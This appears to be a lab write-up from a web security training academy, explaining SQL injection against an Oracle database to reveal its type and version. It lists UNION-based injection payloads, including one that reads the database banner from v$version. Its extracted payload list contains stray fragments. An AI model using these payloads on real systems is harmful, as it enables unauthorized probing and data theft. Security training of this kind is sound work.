## SQL injection attack, querying the database type and version on Oracle

**Category:** sqli
**Difficulty:** Unknown

### Description
This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

### Solution Steps
On Oracle databases, every
SELECT
statement must specify a table to select
FROM
. If your
UNION SELECT
attack does not query from a table, you will still need to include the
FROM
keyword followed by a valid table name.
There is a built-in table on Oracle called
dual
which you can use for this purpose. For example:
UNION SELECT 'abc' FROM dual
For more information, see our
SQL injection cheat sheet
.

### Key Payloads
- `SELECT`
- `FROM`
- `UNION SELECT`
- `dual`
- `UNION SELECT 'abc' FROM dual`
- `category`
- `'+UNION+SELECT+'abc','def'+FROM+dual--`
- `'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: sqli

---
*Source: PortSwigger Web Security Academy*
